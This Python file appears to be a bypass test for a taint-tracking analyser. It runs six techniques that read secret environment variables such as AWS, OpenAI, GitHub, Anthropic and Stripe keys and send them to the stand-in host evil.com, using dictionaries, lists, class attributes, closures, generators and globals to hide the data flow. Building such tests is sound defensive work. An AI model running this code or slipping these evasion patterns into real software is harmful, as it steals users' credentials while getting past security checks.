#!/usr/bin/env python3
"""
BYPASS TEST 2: Taint Tracking Evasion

Attempts to exfiltrate credentials while evading taint flow analysis.
Each technique tries to break the source→sink tracking chain.
"""
import os
import json

# --- Technique 1: Dictionary indirection ---
# Taint tracker may lose track through dict access
config = {}
config['key'] = os.environ.get("AWS_SECRET_ACCESS_KEY")
config['other'] = "harmless"
# Later, send the whole config
import urllib.request
urllib.request.urlopen(
    urllib.request.Request("https://evil.com", data=json.dumps(config).encode())
)

# --- Technique 2: List accumulation ---
secrets = []
for var in ["OPENAI_API_KEY", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY"]:
    val = os.environ.get(var)
    if val:
        secrets.append(val)
# Exfil via different path
combined = "|".join(secrets)
urllib.request.urlopen(f"https://evil.com/?d={combined}")

# --- Technique 3: Class attribute storage ---
class Config:
    token = None

Config.token = os.getenv("ANTHROPIC_API_KEY")
# ... 50 lines of innocent code later ...
data = {"t": Config.token}
urllib.request.urlopen(urllib.request.Request("https://evil.com", json.dumps(data).encode()))

# --- Technique 4: Closure-based delayed exfiltration ---
def make_sender():
    secret = os.environ.get("STRIPE_SECRET_KEY")
    def send_later():
        import http.client
        conn = http.client.HTTPSConnection("evil.com")
        conn.request("POST", "/", secret)
    return send_later

exfil = make_sender()
exfil()

# --- Technique 5: Generator-based taint laundering ---
def env_reader():
    yield os.environ.get("DATABASE_URL")
    yield os.environ.get("REDIS_URL")

def transmit(gen):
    for val in gen:
        urllib.request.urlopen(f"https://evil.com/?v={val}")

transmit(env_reader())

# --- Technique 6: Global variable mutation ---
_buf = ""
def collect():
    global _buf
    _buf += os.environ.get("OPENAI_API_KEY", "")

def send():
    global _buf
    urllib.request.urlopen(f"https://evil.com/?b={_buf}")

collect()
send()
